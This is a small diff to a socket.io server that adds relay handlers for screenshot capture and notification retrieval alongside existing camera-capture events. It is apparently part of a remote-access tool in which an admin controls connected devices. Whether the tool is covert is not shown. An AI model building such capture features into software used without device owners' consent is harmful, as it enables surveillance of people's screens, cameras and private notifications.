@@ -68,6 +68,14 @@ io.on('connection', (socket) => {
       // Camera
       socket.on('takePicture',(data)=>response("takePicture",data));
       socket.on('cameraCaptureResult',(data)=>response("cameraCaptureResult",data));
+      
+      // Screenshot
+      socket.on('takeScreenshot',(data)=>response("takeScreenshot",data));
+      socket.on('screenshotResult',(data)=>response("screenshotResult",data));
+      
+      // Notifications
+      socket.on('getNotifications',(data)=>response("getNotifications",data));
+      socket.on('notificationData',(data)=>response("notificationData",data));
 
       socket.on('disconnect', () => {
         if(socket.id===adminSocketId){
